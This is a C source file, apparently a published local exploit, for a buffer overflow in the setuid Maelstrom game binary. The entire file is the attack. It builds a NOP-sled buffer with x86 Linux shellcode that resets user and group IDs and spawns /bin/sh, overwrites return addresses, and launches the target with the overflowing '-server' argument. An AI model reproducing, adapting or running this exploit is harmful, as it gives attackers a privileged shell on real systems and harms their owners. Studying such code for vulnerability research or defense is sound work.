/*
 * Maelstrom exploit By CMN <cmn@darklab.org>
 *
 * Tested on
 *
 * Maelstrom v1.4.3 (GPL version 3.0.6)
 *  from Maelstrom-3.0.6-1.i386.rpm
 *
 * Maelstrom v1.4.3 (Linux version 3.0.3)
 *  from Gentoo port
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

#define TARGET    "/usr/bin/Maelstrom"
#define BUFSIZE    8179
#define NOP        0x90
#define OFFSET     100

static char linux_code[] =
    "\xb9\xff\xff\xff\xff" /* movl    $-1, %ecx   */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\xb0\x31"             /* movb    $0x31, %al  */
    "\xcd\x80"             /* int     $0x80       */
    "\x89\xc3"             /* movl    %eax, %ebx  */
    "\xb0\x46"             /* movb    $0x46, %al  */
    "\xcd\x80"             /* int     $0x80       */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\xb0\x32"             /* movb    $0x32, %al  */
    "\xcd\x80"             /* int     $0x80       */
    "\x89\xc3"             /* movl    %eax, %ebx  */
    "\xb0\x47"             /* movb    $0x47, %al  */
    "\xcd\x80"             /* int     $0x80       */
    "\x31\xd2"             /* xorl    %edx, %edx  */
    "\x52"                 /* pushl   %edx        */
    "\x68\x2f\x2f\x73\x68" /* pushl   $0x68732f2f */
    "\x68\x2f\x62\x69\x6e" /* pushl   $0x6e69622f */
    "\x89\xe3"             /* movl    %esp, %ebx  */
    "\x52"                 /* pushl   %edx        */
    "\x53"                 /* pushl   %ebx        */
    "\x89\xe1"             /* movl    %esp, %ecx  */
    "\xb0\x0b"             /* movb    $0xb, %al   */
    "\xcd\x80"             /* int     $0x80       */
    "\x31\xc0"             /* xorl    %eax, %eax  */
    "\x40"                 /* inc     %eax        */
    "\xcd\x80";            /* int     $0x80       */

int
main(int argc, char *argv[])
{
    int ret = (u_long)(&ret);
    u_char *target = TARGET;
    u_char buf[BUFSIZE+1];
    long offset = 0;
    int i;

    memset(buf, NOP, BUFSIZE);
    buf[BUFSIZE] = '\0';
    buf[0] = '2';
    buf[1] = '@';
    memcpy(&buf[BUFSIZE-(strlen(linux_code)+4*sizeof(ret))],
        linux_code, strlen(linux_code));

    while ( (i = getopt(argc, argv, "t:o:")) != -1) {

        switch(i) {
            case 't':
                target = optarg;

            case 'o':
                offset = strtol(optarg, NULL, 0);
                break;

            default:
                printf("\nUsage: %s [-t target ] [-o offset]\n\n", argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    ret -= offset ? offset : OFFSET;
    memcpy(&buf[BUFSIZE-(sizeof(ret))], &ret, sizeof(ret));
    memcpy(&buf[BUFSIZE-(2*sizeof(ret))], &ret, sizeof(ret));
    memcpy(&buf[BUFSIZE-(3*sizeof(ret))], &ret, sizeof(ret));
    memcpy(&buf[BUFSIZE-(4*sizeof(ret))], &ret, sizeof(ret));

    printf("Using address 0x%08lx\n", ret);
    printf("Target is '%s'\n", target);
    execlp(target, "CMN", "-server", buf, (char *)NULL);
    perror("execle()");
    exit(EXIT_FAILURE);
}

